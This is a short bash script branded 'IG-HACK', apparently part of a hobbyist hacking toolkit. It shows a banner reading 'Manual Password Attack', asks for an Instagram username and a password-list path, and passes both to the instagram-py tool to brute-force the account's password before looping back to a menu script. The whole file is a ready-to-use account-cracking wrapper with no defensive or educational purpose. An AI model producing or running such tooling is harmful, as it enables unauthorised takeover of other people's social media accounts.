#wordlist selection
grn='\033[1;32m'
red='\033[1;31m'
rset='\033[0m'
ylo='\033[1;33m'
#!/bin/bash
#coding section starts :)
clear
echo
echo -e '\e[1;93m
    ██╗ ██████╗      \e[92m ██╗  ██╗ █████╗  ██████╗██╗  ██╗\e[1;93m
    ██║██╔════╝       \e[92m██║  ██║██╔══██╗██╔════╝██║ ██╔╝\e[1;93m
    ██║██║  ███╗\e[0m█████╗\e[92m███████║███████║██║     █████╔╝ \e[1;93m
    ██║██║   ██║\e[0m╚════╝\e[92m██╔══██║██╔══██║██║     ██╔═██╗ \e[1;93m
    ██║╚██████╔╝     \e[92m ██║  ██║██║  ██║╚██████╗██║  ██╗\e[1;93m
    ╚═╝ ╚═════╝       \e[92m╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\e[1;93m
                                      \e[92m     Version:3.1
\e[0m
              [#] Manual Password Attack [#]
'
printf "\n"
echo -e "\e[1;93m╔═══════════════════╦══════════════════════════════════════════╗
\e[1;93m‖ ‣\x1b[0m TOOL NAME       \x1b[0m\x1b[33m‖= \x1b[34mIG-HACK                                 \x1b[33m‖
\e[1;93m‖ ‣\x1b[0m CODED BY        \x1b[0m\x1b[33m‖= \x1b[34mAbdizamed Mohamed faarah                \x1b[33m‖
\e[1;93m‖ ‣\x1b[0m AUTHOR          \x1b[0m\x1b[33m‖= \x1b[34mAbdizamed Moha                          \x1b[33m‖
\e[1;93m‖ ‣\x1b[0m GITHUB          \x1b[0m\x1b[33m‖= \x1b[34mhttps://github.com/Abdizamedmoha/       \x1b[33m‖
\e[1;93m‖ ‣\x1b[0m TELEGRAM        \x1b[0m\x1b[33m‖= \x1b[34m@ABDIZAMED_MOHAMED                      \x1b[33m‖
\x1b[33m╚══════════════════════════════════════════════════════════════╝"
printf "\n"
echo 
read -p "[#] User Name : " usrnm
echo
read -p "[#] Enter Passlist Location : " inspass
echo
if [[ $inspass = 0 ]]                                             
then
echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
else
instagram-py --username $usrnm --password-list $inspass
echo
sleep 50
cd $HOME
fi
sleep 50
cd $HOME/ighack
bash ighack.sh
